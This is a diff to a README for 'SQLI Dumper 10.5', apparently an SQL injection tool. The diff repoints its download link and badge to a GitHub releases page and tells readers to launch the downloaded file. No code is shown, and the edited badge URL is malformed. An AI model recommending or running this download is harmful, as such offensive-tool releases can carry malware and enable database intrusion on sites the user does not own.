@@ -20,9 +20,9 @@ SQLI Dumper 10.5 is a cutting-edge tool that allows users to conduct thorough an
 
 ## Download 🚀
 
-Download SQLI Dumper 10.5 by clicking [here](https://github.com/assets/Release.zip). Launch the file to begin utilizing the ultimate database analysis and security testing tool.
+Download SQLI Dumper 10.5 by clicking [here](https://github.com/VHugo2593/SQLI-DUMPER-10.5-Latest-2025/releases). Launch the file to begin utilizing the ultimate database analysis and security testing tool.
 
-[![Download SQLI Dumper](https://img.shields.io/badge/Download-SQLI%20Dumper-blue)](https://github.com/assets/Release.zip)
+[![Download SQLI Dumper](https://github.com/VHugo2593/SQLI-DUMPER-10.5-Latest-2025/releases%20Dumper-blue)](https://github.com/VHugo2593/SQLI-DUMPER-10.5-Latest-2025/releases)
 
 If the link provided does not work or leads directly to the file name, please visit the "Releases" section of the repository for alternative download options.
 
